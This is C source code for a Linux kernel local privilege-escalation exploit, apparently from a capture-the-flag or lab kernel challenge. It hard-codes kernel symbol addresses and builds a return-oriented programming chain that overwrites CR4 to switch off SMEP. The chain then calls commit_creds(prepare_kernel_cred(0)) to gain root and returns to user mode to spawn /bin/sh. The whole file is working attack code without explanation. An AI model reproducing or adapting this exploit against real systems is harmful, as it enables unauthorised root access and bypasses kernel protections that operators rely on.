#include <sys/mman.h>
#define native_write_cr4 0xffffffff810489c0
#define PREPARE_KERNEL_CRED 0xffffffff8107aed0
#define COMMIT_CREDS 0xffffffff8107ab40
#define poprdiret 0xffffffff810eed4d
#define swapgs 0xffffffff81048a84
#define iretq 0xffffffff81021d86
#define stack_pivot_gadget 0xffffffff816d8e68
#define stack_top_offset 0x0
#define krop_base_to_map 0x816d8000
#define stack_adjust 0xffffffff81004510// pop rbx ; pop rbp ; ret
int rop_start=0xe68;
void* krop_base_mapped;

unsigned long user_cs, user_ss, user_rflags;

static void save_state()
{
    asm(
        "movq %%cs, %0\n"
        "movq %%ss, %1\n"
        "pushfq\n"
        "popq %2\n"
        : "=r"(user_cs), "=r"(user_ss), "=r"(user_rflags)
        :
        : "memory");
}

void get_shell()
{
    char *shell = "/bin/sh";
    char *args[] = {shell, NULL};
    execve(shell, args, NULL);
}

typedef int __attribute__((regparm(3))) (* _commit_creds)(unsigned long cred);
typedef unsigned long __attribute__((regparm(3))) (* _prepare_kernel_cred)(unsigned long cred);

_commit_creds commit_creds = (_commit_creds)COMMIT_CREDS;
_prepare_kernel_cred prepare_kernel_cred = (_prepare_kernel_cred)PREPARE_KERNEL_CRED;

void get_root_payload(void)
{
    commit_creds(prepare_kernel_cred(0));
}
unsigned long rop_chain[] = {
    stack_adjust,
    0,
    0,
    poprdiret,
    0x6f0,
    native_write_cr4,
    get_root_payload,
    swapgs,
    0, //dummy
    iretq,
    get_shell,
    0,//user_cs,
    0,//user_rflags,
    0,//krop_base_mapped + 0x4000,
    0//user_ss
};
    
void prepare_krop(){
    krop_base_mapped=mmap((void *)krop_base_to_map,0x8000,PROT_READ|PROT_WRITE,MAP_PRIVATE|MAP_ANONYMOUS,-1,0);
    if (krop_base_mapped<0){
        perror("mmap failed");
    }
    rop_chain[11]=user_cs;
    rop_chain[12]=user_rflags;
    rop_chain[13]=krop_base_mapped + 0x4000;
    rop_chain[14]=user_ss;
    memcpy(krop_base_mapped+rop_start,rop_chain,sizeof(rop_chain));
    puts("rop_payload_initialized");
}
